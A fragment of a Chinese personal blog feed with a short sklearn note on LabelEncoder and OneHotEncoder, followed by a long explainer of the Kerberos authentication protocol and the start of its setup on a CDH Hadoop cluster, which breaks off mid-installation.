    <content type="html"><![CDATA[<blockquote><p>不得不说 我还是小看了ML的知识涉及的广度<br>光是ML 100days 的第一天其实涉及的内容就非常多<br>从Sklearn包到pycharm自带的各种BUG都搞的人头大</p><p>总算把这个整的有点明白了</p></blockquote><a id="more"></a> <h3 id="LabelEnconder"><a href="#LabelEnconder" class="headerlink" title="LabelEnconder"></a>LabelEnconder</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEconder</span><br><span class="line">y = data.iloc[:.<span class="number">-1</span>] <span class="comment"># 索引所有的行 最后一列</span></span><br><span class="line"><span class="comment"># 三步</span></span><br><span class="line">le = LabelEnconder() <span class="comment"># 实例化</span></span><br><span class="line">le = le.fit(y) <span class="comment"># 导入数据</span></span><br><span class="line">label = le.transform(y) <span class="comment"># trasform就扣调取结果</span></span><br><span class="line"><span class="comment"># 这边fit了之后可以直接用le.classes_ 查看标签中有多少类别</span></span><br><span class="line">le.classes_</span><br><span class="line"><span class="comment"># 输出 array(['No','Unknown','Yes'],dtype=object)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 也可以直接fit_transform()一步到位</span></span><br><span class="line">le.fit_transform(y)</span><br><span class="line"><span class="comment"># 这样看不到属性</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从上到下一步到位</span></span><br><span class="line">data.iloc[: , <span class="number">-1</span>] = LabelEncoder().fit_transform(data.iloc[: , <span class="number">-1</span>])</span><br><span class="line"><span class="comment"># 实例化、fit transform 全部完成</span></span><br></pre></td></tr></table></figure><h3 id="OneHotEncoder"><a href="#OneHotEncoder" class="headerlink" title="OneHotEncoder"></a>OneHotEncoder</h3><p>遇到互相不相关的属性，为了避免模型训练的时候把欧式距离计算进去，对结果造成影响<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder</span><br><span class="line">X = data.iloc[:,<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">enc = OneHotEncoder(categories=<span class="string">'auto'</span>).fit(X)</span><br><span class="line">result = enc.transform(X).toarray()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 任然可以一步到位</span></span><br><span class="line">OneHotEncoder(categories=<span class="string">'auto'</span>).fit_transform(X).toattay()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同时这个数值还可以还原</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">pd.DataFrame(enc.inverse_transform(result))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当被哑变量（Onehot）之后，需要一个借口来查看每列的意义</span></span><br><span class="line">enc.get_feature_names()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还有 concat 方法可以将两个表相连</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;不得不说 我还是小看了ML的知识涉及的广度&lt;br&gt;光是ML 100days 的第一天其实涉及的内容就非常多&lt;br&gt;从Sklearn包到pycharm自带的各种BUG都搞的人头大&lt;/p&gt;
&lt;p&gt;总算把这个整的有点明白了&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Mechine-Learning/"/>
    
    
      <category term="sklearn" scheme="http://yoursite.com/tags/sklearn/"/>
    
      <category term="OneHotEncoder" scheme="http://yoursite.com/tags/OneHotEncoder/"/>
    
      <category term="LabelEncoder" scheme="http://yoursite.com/tags/LabelEncoder/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos For CDH</title>
    <link href="http://yoursite.com/2019/06/18/Kerberos%20For%20CDH/"/>
    <id>http://yoursite.com/2019/06/18/Kerberos For CDH/</id>
    <published>2019-06-18T07:40:44.147Z</published>
    <updated>2019-05-15T01:27:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>从18年底开始，公司的服务器经常受到各种挖矿脚本病毒的公司，Java后端Redis漏洞层出不穷，Hadoop这边MR的提交权限BUG也被利用了，于是决定调研Kerberos，发现Kerberos是一个巨大的坑，在此记录下笔记，作为我的Github Pages第一篇文档，希望后来人少走弯路。此文可能分为几次更新。</p><p>第一次更新：2019-4-29</p><p>第二次更新：2019-5-10</p><a id="more"></a> <h3 id="1-Kerberos-入门"><a href="#1-Kerberos-入门" class="headerlink" title="1.Kerberos 入门"></a>1.Kerberos 入门</h3><p>Kerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。Hadoop集群中涉及的Kerberos一般是指MIT基于Kerberos协议开发的一套软件。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2fvwiwb03g20rs0fvaa2.gif" alt="ALT Kerberos"></p><p>Kerberos在希腊神话中是Hades的一条凶猛的三头保卫神犬。这三个头在Kerberos代表了Client、Server和KDC。</p><p><em>Kerberos的特点</em>：并不要求通信双方所在的网络环境安全，即使通信过程中数据被截取或者篡改，依然不会影响整套机制的正常工作。时间戳是Kerberos用来保证通信安全的重要手段。</p><p><em>Kerberos的基本思路</em>：基于对称加密，利用集中的认证服务器，实现用户和服务器之间的双向认证。(提供一种不能伪造、不能重放、已经鉴别的票据对象)。</p><hr><h3 id="2-Kerberos涉及名词"><a href="#2-Kerberos涉及名词" class="headerlink" title="2.Kerberos涉及名词"></a>2.Kerberos涉及名词</h3><p><strong>Principal</strong>：认证的主体，简单来说也就是 用户名</p><p><strong>Kinit</strong>：Kerberos认证(登录)命令，可以使用密码或者KEYTAB</p><p><strong>realm</strong>：有点类似namespace，一个principle只有在某个realm下才有意义</p><p><strong>Password</strong>：某个用户的密码，对应于Kerberos中的master key。password可以存在一个KEYTAB文件中。所以Kerberos中需要使用密码的场景都可以用一个KEYTAB作为输入</p><p><strong>credential</strong>：credential是“证明某个人确定是他自己/某一种行为的确可以发生”的凭据。在不同的使用场景下， credential的具体含义也略有不同：</p><ul><li><p>对于某个principal个体而言，他的credential就是他的password</p></li><li><p>在Kerberos认证的环节中，credential就意味着各种各样的ticket</p></li></ul><p><strong>TGT</strong>：Ticket Granting Ticket，要获得key还需要一个资格认证，获得这个资格认证的证明，叫做TGT</p><p><strong>Long-term Key/Master Key</strong>：在Security的领域中，有的Key可能长期内保持不变，比如你在密码，可能几年都不曾改变，这样的Key、以及由此派生的Key被称为Long-term Key。对于Long-term Key的使用有这样的原则：被Long-term Key加密的数据不应该在网络上传输。原因很简单，一旦这些被Long-term Key加密的数据包被恶意的网络监听者截获，在原则上，只要有充足的时间，他是可以通过计算获得你用于加密的Long-term Key的——任何加密算法都不可能做到绝对保密。</p><p><strong>Short-term Key/Session Key</strong>：由于被Long-term Key加密的数据包不能用于网络传送，所以我们使用另一种Short-term<br>Key来加密需要进行网络传输的数据。由于这种Key只在一段时间内有效，即使被加密的数据包被黑客截获，等他把Key计算出来的时候，这个Key早就已经过期了。</p><hr><h3 id="3-Kerberos原理"><a href="#3-Kerberos原理" class="headerlink" title="3.Kerberos原理"></a>3.Kerberos原理</h3><p>最简单的对称加密的思路：A发送信息给B，信息分为两段，一段是明文，一段是加密之后的密文，这个密钥只有A和B两个人知道，B收到信息后，用两个人都知道的密钥破解了这段密文，如果破解之后的内容和明文内容一致就说明 A的身份没有问题。</p><p><strong>Kerberos就是基于此基础之上的一套复杂的认证机制。</strong></p><p>下面对整个认证过程进行一个细致的分析，对于安装部署过程中纠错来说（尤其CDH集群集成的<code>Kerberos</code>有一些问题），这个过程是非常有必要的：</p><p>通过第二节介绍的两种Key，让被认证的一方提供一个仅限于他和认证方知晓的Key来鉴定对方的真实身份。而被这个<code>Key</code>加密的数据包需要在<code>Client</code>和<code>Server</code>之间传送，所以这个<code>Key</code>不能是一个<code>Long-term Key</code>，而只可能是<code>hort-term Key</code>，这个可以仅仅在<code>Client</code>和<code>Server</code>的一个<code>Session</code>中有效，所以我们称这个<code>Key</code>为<code>Client</code>和<code>Server</code>之间的<code>Session Key（Sserver-Client）</code>。</p><p>这个<code>Sserver-Client</code> 需要引入<code>Kerberos</code>中的一个十分重要的觉得：<code>Kerberos Distribution Center-KDC</code>。<code>KDC</code>在整个<code>Kerberos</code>认证流程中作为<code>Client</code>和<code>Server</code>共同信任的第三方起着重要的作用，而<code>Kerberos</code>的认证过程就是通过这三方协作完成。<code>KDC</code>中维护着一个存储着该<code>Domain</code>中所有账户的<code>Account Database</code>（一个轻量级的数据库），这个数据库汇中存储着每个<code>Account</code>的名称和派生于该<code>Account Password</code>的<code>Master Key</code>，派生手段一般来说是类似Hash这种，不可逆的，然后可以一一对应的方法。</p><p>稍微扩展一下上面的<code>key</code>的分发过程：</p><p>首先是<code>Client</code>向<code>KDC</code>发送一个对<code>SServer-Client</code>的申请。这个申请的内容可以简单概括为“我是某个<code>Client</code>，我需要一个<code>Session Key</code>用于访问某个<code>Server</code> ”。<code>KDC</code>在接受了这个请求以后，生成一个<code>Session</code>Key，为了保证这个<code>Session Key</code>仅仅限于发送请求的<code>Client</code>和他希望访问的<code>Server</code>知晓，<code>KDC</code>会为这个<code>Session Key</code>生成两个<code>Copy</code>，分别被<code>Client</code>和<code>Server</code>使用。然后从<code>Account database</code>中提取<code>Client</code>和<code>Server</code>的<code>Master Key</code>分别对这两个<code>Copy</code>进行对称加密。对于后者，和<code>Session Key</code>一起被加密的还包含关于<code>Client</code>的一些信息。（这里的<code>Client</code>可以理解为发送连接请求的节点，<code>Server</code>可以理解为<code>Client</code>发送请求的接受节点）。</p><p>现在KDC有了两个分别被<code>Master</code>和<code>Server</code>的<code>Master key</code>加密过的<code>Session Key</code>，下面介绍这两个<code>Session Key</code>的处理方式。</p><p>Kerberos 并不会直接把两个加密包分别发送给<code>Client</code>和<code>Server</code>，原因主要有两个：</p><p>第一：由于一个<code>Server</code>会面对若干不同的<code>Client</code>, 而每个<code>Client</code>都具有一个不同的<code>Session Key</code>。那么<code>Server</code>就会为所有的<code>Client</code>维护这样一个<code>Session Key</code>的列表，这样对于<code>Server</code>来说是比较麻烦而低效的。</p><p>第二：由于网络传输的不确定性，可能出现这样一种情况：<code>Client</code>很快获得<code>Session Key</code>，并将这个<code>Session Key</code>作为<code>Credential</code>随同访问请求发送到<code>Server</code>，但是用于<code>Server</code>的<code>Session Key</code>确还没有收到，并且很有可能承载这个<code>Session Key</code>的永远也到不了<code>Server</code>端，<code>Client</code>将永远得不到认证。</p><p>为了解决这个问题，<code>Kerberos</code>的做法是：<strong>将这两个被加密的<code>Copy</code>一并发送给<code>Client</code>，属于<code>Server</code>的那份由<code>Client</code>发送给<code>Server</code>。</strong></p><p><code>Client</code>实际上获得了两组信息：一个通过自己<code>Master Key</code>加密的<code>Session Key</code>，另一个被<code>Server</code>的<code>Master Key</code>加密的数据包，包含<code>Session Key</code>和关于自己的一些确认信息。通过一个双方知晓的<code>Key</code>就可以对对方进行有效的认证，但是在一个网络的环境中，这种简单的做法是具有安全漏洞，为此,<code>Client</code>需要提供更多的证明信息，我们把这种证明信息称为<code>Authenticator</code>，在<code>Kerberos</code>的<code>Authenticator</code>实际上就是关于<code>Client</code>的一些信息和当前时间的一个<code>Timestamp</code>。</p><p><code>Client</code>通过自己的<code>Master Key</code>对<code>KDC</code>加密的<code>Session Key</code>进行解密从而获得<code>Session Key</code>，随后创建<strong><code>Authenticator（Client Info + Timestamp）</code></strong>并用<code>Session Key</code>对其加密。最后连同从<code>KDC</code>获得的、被<code>Server</code>的<code>Master Key</code>加密过的数据包<strong><code>（Client Info + Session Key）</code></strong>一并发送到<code>Server</code>端。我们把通过<code>Server</code>的<code>Master Key</code>加密过的数据包称为<code>Session Ticket</code>。当<code>Server</code>接收到这两组数据后，先使用他自己的<code>Master Key</code>对<code>Session Ticket</code>进行解密，从而获得<code>Session Key</code>。随后使用该<code>Session Key</code>解密<code>Authenticator</code>，通过比较<code>Authenticator</code>中的<code>Client Info</code>和<code>Session Ticket</code>中的<code>Client Info</code>从而实现对Client的认证。</p><p>这里涉及到了一个<code>Timestamp</code>，<code>Client</code>向<code>Server</code>发送的数据包如果被某个恶意网络监听者截获，该监听者随后将数据包作为自己的<code>Credential</code>冒充该<code>Client</code>对<code>Server</code>进行访问，在这种情况下，依然可以很顺利地获得<code>Server</code>的成功认证。为了解决这个问题，<code>Client</code>在<code>Authenticator</code>中会加入一个当前时间的<code>Timestamp</code>。</p><p>在<code>Server</code>对<code>Authenticator</code>中的<code>Client Info</code>和<code>Session Ticket</code>中的<code>Client Info</code>进行比较之前，会先提取<code>Authenticator</code>中的<code>Timestamp</code>，并同当前的时间进行比较，如果他们之间的偏差超出一个可以<strong>接受的时间范围（一般是5mins）</strong>，<code>Server</code>会直接拒绝该<code>Client</code>的请求。在这里需要知道的是，<code>Server</code>维护着一个列表，这个列表记录着在这个可接受的时间范围内所有进行认证的Client和认证的时间。对于时间偏差在这个可接受的范围中的<code>Client</code>，<code>Server</code>会从这个列表中获得<strong>最近一个该<code>Client</code>的认证时间</strong>，只有当<code>Server</code>接收到<code>Authenticator</code>时，验证<code>Authenticator</code>中的<code>Timestamp</code>，确定传输时间小于接受范围后，<code>Server</code>才采用进行后续的认证流程。</p><hr><p><strong><code>Time Synchronization</code>的重要性</strong></p><p>上述基于<code>Timestamp</code>的认证机制只有在<code>Client</code>和<code>Server</code>端的时间保持同步的情况才有意义。所以保持<code>Time</code> <code>Synchronization</code>在整个认证过程中显得尤为重要。在一个<code>Domain</code>中，一般通过访问同一个<code>Time Service</code>获得当前时间的方式来实现时间的同步。</p><p><strong>双向认证（Mutual Authentication）</strong></p><p><code>Kerberos</code>一个重要的优势在于它能够提供双向认证：不但<code>Server</code>可以对<code>Client</code> 进行认证，<code>Client</code>也能对<code>Server</code>进行认证。</p><p>具体过程是这样的，如果<code>Client</code>需要对他访问的<code>Server</code>进行认证，会在它向<code>Server</code>发送的<code>Credential</code>中设置一个是否需要认证的<code>Flag</code>。<code>Server</code>在对<code>Client</code>认证成功之后，会把<code>Authenticator</code>中的<code>Timestamp</code>提出来，通过<code>Session Key</code>进行加密，当<code>Client</code>接收到并使用<code>Session Key</code>进行解密之后，如果确认<code>Timestamp</code>和原来的完全一致，那么他可以认定<code>Server</code>正试图访问的<code>Server</code>。</p><p>那么为什么<code>Server</code>不直接把通过Session Key进行加密的<code>Authenticator</code>原样发送给<code>Client</code>，而要把<code>Timestamp</code>提取出来加密发送给<code>Client</code>呢？原因在于防止恶意的监听者通过获取的<code>Client</code>发送的<code>Authenticator</code>冒充<code>Server</code>获得<code>Client</code>的认证。</p><p><strong>More</strong>：</p><p>通过上面的介绍，我们发现<code>Kerberos</code>实际上一个基于<code>Ticket</code>的认证方式。<code>Client</code>想要获取<code>Server</code>端的资源，先得通过<code>Server</code>的认证；而认证的先决条件是<code>Client</code>向<code>Server</code>提供从<code>KDC</code>获得的一个有<code>Server</code>的<code>Master Key</code>进行加密的<code>Session Ticket</code>（<code>Session Key + Client Info</code>）。可以这么说，<code>Session Ticket</code>是<code>Client</code>进入<code>Server</code>领域的一张门票。而这张门票必须从一个合法的<code>Ticket</code>颁发机构获得，这个颁发机构就是<code>Client</code>和<code>Server</code>双方信任的<code>KDC</code>， 同时这张<code>Ticket</code>具有超强的防伪标识：<strong>它是被<code>Server</code>的<code>Master Key</code>加密的。对<code>Client</code>来说， 获得<code>Session</code> <code>Ticket</code>是整个认证过程中最为关键的部分。</strong></p><hr><p>我了解到这儿感觉已经差不多了，然而这还只是Kerbeos的梗概  T_T</p><p><code>Client</code>要获得<code>Ticket</code>之前，还需要一个步骤，即获得<code>KDC</code>的权限确认，这个过程叫做<code>TGT：Ticket</code><br><code>Granting Ticket</code>。<code>TGT</code>的分发方仍然是<code>KDC</code>。首先<code>Client</code>向<code>KDC</code>发起对<code>TGT</code>的申请，申请的内容大致可以这样表示：“我需要一张<code>TGT</code>用以申请获取用以访问所有<code>Server</code>的<code>Ticket</code>”。<code>KDC</code>在收到该申请请求后，生成一个用于该<code>Client</code>和<code>KDC</code>进行安全通信的<code>Session Key（SKDC-Client）</code>。为了保证该<code>Session Key</code>仅供该<code>Client</code>和自己使用，<code>KDC</code>使用<code>Client</code>的<code>Master Key</code>和自己的<code>Master Key</code>对生成的<code>Session Key</code>进行加密，从而获得两个加密的<code>SKDC-Client</code>的<code>Copy</code>。对于后者，随<code>SKDC-Client</code>一起被加密的还包含以后用于鉴定<code>Client</code>身份的关于<code>Client</code>的一些信息。最后<code>KDC</code>将这两份<code>Copy</code>一起发送给<code>Client</code>。这里有一点需要注意的是：为了免去<code>KDC</code>对于基于不同<code>Client</code>的<code>Session Key</code>进行维护的麻烦，就像<code>Server</code>不会保存<code>Session Key（SServer-Client）</code>一样，<code>KDC</code>也不会去保存这个<code>Session Key（SKDC-Client）</code>，而选择完全靠<code>Client</code>自己提供的方式。</p><p>当<code>Client</code>收到<code>KDC</code>的两个加密数据包之后，先使用自己的<code>Master Key</code>对第一个<code>Copy</code>进行解密，从而获得<code>KDC</code>和<code>Client</code>的<code>Session</code><br><code>Key（SKDC-Client）</code>，并把该<code>Session</code> 和<code>TGT</code>进行缓存。有了<code>Session Key</code>和<code>TGT</code>，<code>Client</code>自己的<code>Master</code><br><code>Key</code>将不再需要，因为此后<code>Client</code>可以使用<code>SKDC-Client</code>向<code>KDC</code>申请用以访问每个<code>Server</code>的<code>Ticket</code>。同时需要注意的是<code>SKDC-Client</code>是一个<code>Session Key</code>，他具有自己的生命周期，同时<code>TGT</code>和<code>Session</code>相互关联，当<code>Session Key</code>过期，<code>TGT</code>也就宣告失效，此后<code>Client</code>不得不重新向<code>KDC</code>申请新的<code>TGT</code>，<code>KDC</code>将会生成一个不同<code>Session Key</code>和与之关联的<code>TGT</code>。同时，由于<code>Client Log off</code>也导致<code>SKDC-Client</code>的失效，所以<code>SKDC-Client</code>又被称为<code>Logon Session Key</code>。<strong><code>TGT</code>和<code>Ticket</code>有个区别就是<code>Ticket</code>是基于某个具体的<code>Server</code>的，而<code>TGT</code>则是和具体的<code>Server</code>无关的。</strong></p><p><code>Client</code>在获得自己和<code>KDC</code>的<code>Session Key（SKDC-Client）</code>之后，生成自己的<code>Authenticator</code>以及所要访问的<code>Server</code>名称的并使用<code>SKDC-Client</code>进行加密。随后连同<code>TGT</code>一起发送给<code>KDC</code>。<code>KDC</code>使用自己的<code>Master Key</code>对<code>TGT</code>进行解密，提取<code>Client Info</code>和<code>Session Key（SKDC-Client）</code>，然后使用这个<code>SKDC-Client</code>解密<code>Authenticator</code>获得<code>Client Info</code>，对两个<code>Client Info</code>进行比较进而验证对方的真实身份。验证成功，生成一份基于<code>Client</code>所要访问的<code>Server</code>的<code>Ticket</code>给<code>Client</code>，然后继续上面之说的过程。</p><p>介绍了这么多，重新把整个过程理一遍：</p><p>现在介绍的整个Authentication过程大概分为三个子过程</p><ul><li><p>Client向KDC申请TGT（Ticket Granting Ticket）。</p></li><li><p>Client通过获得TGT向DKC申请用于访问Server的Ticket。</p></li><li><p>Client最终向为了Server对自己的认证向其提交Ticket。</p></li></ul><p>整个Kerberos Authentication认证过程通过3个sub-protocol来完成：</p><ol><li>Authentication Service Exchange</li><li>Ticket Granting Service Exchange</li><li>Client/Server Exchange</li></ol><p>下面内容来自官方文档的翻译：</p><p>1.Authentication Service Exchange</p><p><code>Client</code>向<code>KDC</code>的<code>Authentication Service</code>发送<code>Authentication Service Request</code>（<code>KRB_AS_REQ</code>）, 为了确保<code>KRB_AS_REQ</code>仅限于自己和<code>KDC</code>知道，<code>Client</code>使用自己的<code>Master Key</code>对<code>KRB_AS_REQ</code>的主体部分进行加密（<code>KDC</code>可以通过<code>Domain</code> 的<code>Account Database</code>获得该<code>Client</code>的<code>Master Key</code>）。<code>KRB_AS_REQ</code>的大体包含以下的内容：</p><ul><li><code>Pre-authentication data</code>：包含用以证明自己身份的信息。说白了，就是证明自己知道自己声称的那个<code>account</code>的<code>Password</code>。一般地，它的内容是一个被<code>Client</code>的<code>Master key</code>加密过的<code>Timestamp</code>。</li><li><code>Client name</code> &amp; <code>realm</code>: 简单地说就是<code>Domain name\Client</code></li><li><code>Server Name</code>：注意这里的<code>Server Name</code>并不是<code>Client</code>真正要访问的<code>Server</code>的名称，而我们也说了<code>TGT</code>是和<code>Server</code>无关的（<code>Client</code>只能使用<code>Ticket</code>，而不是<code>TGT</code>去访问<code>Server</code>）。这里的<code>Server Name</code>实际上是<code>KDC</code>的<code>Ticket Granting Service</code>的<code>Server Name</code>。</li></ul><p><code>AS（Authentication Service）</code>通过它接收到的<code>KRB_AS_REQ</code>验证发送方的是否是在<code>Client name</code> &amp; <code>realm</code>中声称的那个人，也就是说要验证发送方是否知道<code>Client</code>的<code>Password</code>。所以<code>AS</code>只需从<code>Account Database</code>中提取<code>Client</code>对应的<code>Master Key</code>对<code>Pre-authentication data</code>进行解密，如果是一个合法的<code>Timestamp</code>，则可以证明发送方提供的是正确无误的密码。验证通过之后，<code>AS</code>将一份<code>Authentication Service</code> <code>Response（KRB_AS_REP）</code>发送给<code>Client</code>。<code>KRB_AS_REQ</code>主要包含两个部分：本<code>Client</code>的<code>Master Key</code>加密过的<code>Session Key（SKDC-Client：Logon Session Key）</code>和被自己（<code>KDC</code>）加密的<code>TGT</code>。而<code>TGT</code>大体又包含以下的内容：</p><ul><li><p><code>Client name &amp; realm</code>: 简单地说就是<code>Domain name\Client</code></p></li><li><p><code>Client name &amp; realm</code>: 简单地说就是<code>Domain name\Client</code></p></li><li><p><code>End time</code>: <code>TGT</code>到期的时间</p></li></ul><p>Client通过自己的Master Key对第一部分解密获得Session Key（SKDC-Client：Logon Session Key）之后，携带着TGT便可以进入下一步：TGS（Ticket Granting Service）Exchange。</p><p>2.Ticket Granting Service Exchange</p><p><code>TGS</code>（<code>Ticket Granting Service</code>）<code>Exchange</code>通过<code>Client</code>向<code>KDC</code>中的<code>TGS</code>（<code>Ticket Granting Service</code>）发送<code>Ticket Granting Service Request</code>（<code>KRB_TGS_REQ</code>）开始。<code>KRB_TGS_REQ</code>大体包含以下的内容：</p><ul><li><p>TGT：Client通过AS Exchange获得的Ticket Granting Ticket，TGT被KDC的Master Key进行加密。</p></li><li><p>Authenticator：用以证明当初TGT的拥有者是否就是自己，所以它必须以TGT的办法方和自己的Session Key（SKDC-Client：Logon Session Key）来进行加密。</p></li><li><p>Client name &amp; realm: 简单地说就是Domain name\Client。</p></li><li><p>Server name &amp; realm: 简单地说就是Domain name\Server，这回是Client试图访问的那个Server。</p></li></ul><p><code>TGS</code>收到<code>KRB_TGS_REQ</code>在发给<code>Client</code>真正的<code>Ticket</code>之前，先得整个<code>Client</code>提供的那个<code>TGT</code>是否是<code>AS</code>颁发给它的。于是它不得不通过<code>Client</code>提供的<code>Authenticator</code>来证明。但是<code>Authentication</code>是通过<code>Logon Session Key（SKDC-Client）</code>进行加密的，而自己并没有保存这个<code>Session Key</code>。所以TGS先得通过自己的<code>Master Key</code>对<code>Client</code>提供的<code>TGT</code>进行解密，从而获得这个<code>Logon Session Key（SKDC-Client）</code>，再通过这个<code>Logon Session Key（SKDC-Client）</code>解密<code>Authenticator</code>进行验证。验证通过向对方发送<code>Ticket Granting</code><br><code>Service Response（KRB_TGS_REP）</code>。这个<code>KRB_TGS_REP</code>有两部分组成：使用<code>Logon Session Key（SKDC-Client）</code>加密过用于<code>Client</code>和<code>Server</code>的<code>Session Key（SServer-Client）</code>和使用<code>Server</code>的<code>Master Key</code>进行加密的<code>Ticket</code>。该<code>Ticket</code>大体包含以下一些内容：</p><ul><li><p>Client name &amp; realm: 简单地说就是Domain name\Client</p></li><li><p>Client name &amp; realm: 简单地说就是Domain name\Client</p></li><li><p>End time: Ticket的到期时间</p></li></ul><p><code>Client</code>收到<code>KRB_TGS_REP</code>，使用<code>Logon Session Key（SKDC-Client）</code>解密第一部分后获得<code>Session Key（SServer-Client）</code>。有了<code>Session Key</code>和<code>Ticket，Client</code>就可以之间和<code>Server</code>进行交互，而无须在通过<code>KDC</code>作中间人了。所以我们说<code>Kerberos</code>是一种高效的认证方式，它可以直接通过<code>Client</code>和<code>Server</code>双方来完成，不像Windows NT 4下的<code>NTLM</code>认证方式，每次认证都要通过一个双方信任的第3方来完成。</p><p>我们现在来看看 <code>Client</code>如果使用<code>Ticket</code>和<code>Server</code>怎样进行交互的，这个阶段通过我们的第3个<code>Sub-protocol</code>来完成：<code>CS（Client/Server ）Exchange</code>。</p><ol start="3"><li>CS（Client/Server ）Exchange</li></ol><p>这个已经经介绍过。<code>Client</code>通过<code>TGS Exchange</code>获得<code>Client</code>和<code>Server</code>的<code>Session Key（SServer-Client）</code>，随后创建用于证明自己就是Ticket的真正所有者的<code>Authenticator</code>，并使用<code>Session Key（SServer-Client）</code>进行加密。最后将这个被加密过的<code>Authenticator</code>和<code>Ticket</code>作为<code>Application Service Request（KRB_AP_REQ）</code>发送给<code>Server</code>。除了上述两项内容之外，<code>KRB_AP_REQ</code>还包含一个<code>Flag</code>用于表示<code>Client</code>是否需要进行双向验证（<code>Mutual Authentication</code>）。</p><p><code>Server</code>接收到<code>KRB_AP_REQ</code>之后，通过自己的<code>Master Key</code>解密<code>Ticket</code>，从而获得<code>Session Key（SServer-Client）</code>。通过<code>Session Key（SServer-Client）</code>解密<code>Authenticator</code>，进而验证对方的身份。验证成功，让<code>Client</code>访问需要访问的资源，否则直接拒绝对方的请求。</p><p>对于需要进行双向验证，<code>Server</code>从<code>Authenticator</code>提取<code>Timestamp</code>，使用<code>Session Key（SServer-Client）</code>进行加密，并将其发送给<code>Client</code>用于<code>Client</code>验证<code>Server</code>的身份。</p><hr><p>以上是2000年的<code>Kerberos</code>技术，和今天我们使用的<code>Kerberos</code>是不太相同的，因为这样的一个认证过程有一个最大的隐患就是<strong>Long-term Key加密的数据在网络中传递</strong>。</p><p>解决办法也很简单：就是采用一个<code>Short-term</code>的<code>Session Key</code>，而不是<code>Server Master Key</code>对<code>Ticket</code>进行加密。这就是<code>Kerberos</code>的第四个<code>Sub-protocol</code>：<code>User2User Protocol</code>。</p><p>因为<code>KDC</code>是不是维护<code>Session Key</code>的，所以这个<code>Session key</code>只能靠申请<code>Ticket</code>的<code>Client</code>提供，所以在原先的第一步和第二步之间，<code>Client</code>还得对<code>Server</code>进行请求已获得<code>Server</code>和<code>KDC</code>之间的<code>Session Key</code>。而对于<code>Server</code>来说，他可以像<code>Client</code>一样通过<code>AS Exchange</code>获得他和<code>KDC</code>之间的<code>Session Key</code>（<code>SKDC-Server</code>）和一个封装了这个<code>Session Key</code>并被<code>KDC</code>的<code>Master Key</code>进行加密的<code>TGT</code>，一旦获得这个<code>TGT</code>，<code>Server</code>会缓存它，以待<code>Client</code>对它的请求。</p><p>所以现在添加完这个User2User的认证过程，这个过程有4个步骤组成，四个步骤如下：</p><ul><li><p>AS Exchange：Client通过此过程获得了属于自己的TGT，有了此TGT，Client可凭此向KDC申请用于访问某个Server的Ticket。</p></li><li><p>User2User：这一步的主要任务是获得封装了Server和KDC的Session Key（SKDC-Server）的属于Server的TGT。如果该TGT存在于Server的缓存中，则Server会直接将其返回给Client。否则通过AS Exchange从KDC获取。</p></li><li>TGS Exchange：Client通过向KDC提供自己的TGT，Server的TGT以及Authenticator向KDC申请用于访问Server的Ticket。KDC使用先用自己的Master Key解密Client的TGT获得SKDC-Client，通过SKDC-Client解密Authenticator验证发送者是否是TGT的真正拥有者，验证通过再用自己的Master Key解密Server的TGT获得KDC和Server 的Session Key（SKDC-Server），并用该Session Key加密Ticket返回给Client。</li><li>C/S Exchange：Client携带者通过KDC和Server 的Session Key（SKDC-Server）进行加密的Ticket和通过Client和Server的Session Key（SServer-Client）的Authenticator访问Server，Server通过SKDC-Server解密Ticket获得SServer-Client，通过SServer-Client解密Authenticator实现对Client的验证。</li></ul><hr><h3 id="4-Kerberos的安装和Apach原生HDFS的配置"><a href="#4-Kerberos的安装和Apach原生HDFS的配置" class="headerlink" title="4.Kerberos的安装和Apach原生HDFS的配置"></a>4.Kerberos的安装和Apach原生HDFS的配置</h3><p><strong>环境：</strong></p><ul><li>Linux版本：CentOS Linux release 7.2.1511 (Core)</li><li>CDH版本：5.13.3</li><li>JDK版本：jdk1.8.0_144</li><li>运行用户：root</li></ul><p><strong>准备工作：</strong></p><p>确认添加主机名解析到/etc/hosts 文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.16.0.3  master</span><br><span class="line">172.16.0.4  datanode0</span><br><span class="line">172.16.0.5  datanode1</span><br></pre></td></tr></table></figure><p>hostname 请使用小写，要不然在集成Kerberos 时会出现一些错误。</p><p><strong>安装Kerberos</strong>:</p><p>在<code>master</code>上安装包 <code>krb5</code>、<code>krb5-server</code> 